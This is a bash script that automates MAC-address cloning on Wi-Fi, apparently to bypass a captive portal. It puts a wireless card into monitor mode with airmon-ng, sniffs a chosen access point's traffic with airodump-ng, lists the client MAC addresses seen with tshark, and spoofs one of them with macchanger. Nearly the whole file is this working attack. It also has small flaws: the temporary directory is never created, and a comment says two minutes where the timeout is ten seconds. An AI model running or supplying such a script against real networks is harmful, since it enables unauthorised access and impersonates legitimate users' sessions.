#!/bin/bash

function check_command {
    if ! command -v "$1" >/dev/null 2>&1 ; then
        echo "$1 not found!"
        exit 1
    else
        echo "$1 found!"
    fi
}

# check if root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root"
    exit
fi

# Check if macchanger is installed
check_command macchanger
# the aircrack package provides airmon-ng, airodump-ng, and other tools
check_command aircrack-ng
check_command iwlist
check_command tshark

select interface in $(airmon-ng | awk 'NR>2 {print $2}'); do
    break
done

echo scanning for networks
IFS=$'\n'
select target in $(iwlist $interface scanning | awk '/Address/ {bssid=$5} /ESSID/ {split($1,arr,":"); print bssid, arr[2]}')
do
    bssid=$(echo $target | awk '{print $1}')
    echo "Selected BSSID: $bssid"
    break
done
unset IFS

# check for processes that might interfere with the script

readarray -t services < <(airmon-ng check | awk '/.*PID.*Name/{header=1;next;} (header && length($2) > 0) {print $2};' | sort | uniq)

# stop services
for service in "${services[@]}"; do
    echo "Stopping $service..."
    sudo systemctl stop "$service"
done

# kill any stragglers
airmon-ng check kill > /dev/null

airmon-ng start "$interface"

#setup trap to restart services
trap 'airmon-ng stop ${interface}mon; for service in "${services[@]}"; do echo "Starting $service..."; sudo systemctl start "$service";  done' EXIT


echo "Creating temporary working directory..."
temporary_directory="/tmp/captive/" # $mktemp -d)

cd $temporary_directory
pwd

# # Run airodump-ng to capture network data for 2 minutes
echo "Running airodump-ng to capture network data..."
sudo timeout 10s airodump-ng --write output --output-format pcap --bssid $bssid ${interface}mon 
latest_packet_file=$(ls -t output*.cap | head -n 1)
IFS=$'\n'
select mac_options in $(tshark -r ./${latest_packet_file} -T fields -e wlan.sa 2>/dev/null | grep -v '^$' | sort | uniq -c | head | sort -rnk 1)
do
    echo $mac_options
    new_mac=$(echo $mac_options | awk '{print $2}')
    break
done
unset IFS

airmon-ng stop "${interface}mon"
echo "Changing MAC address of ${interface} interface to $new_mac..."
ifconfig $interface down
macchanger -m "$new_mac" "${interface}"
ifconfig $interface up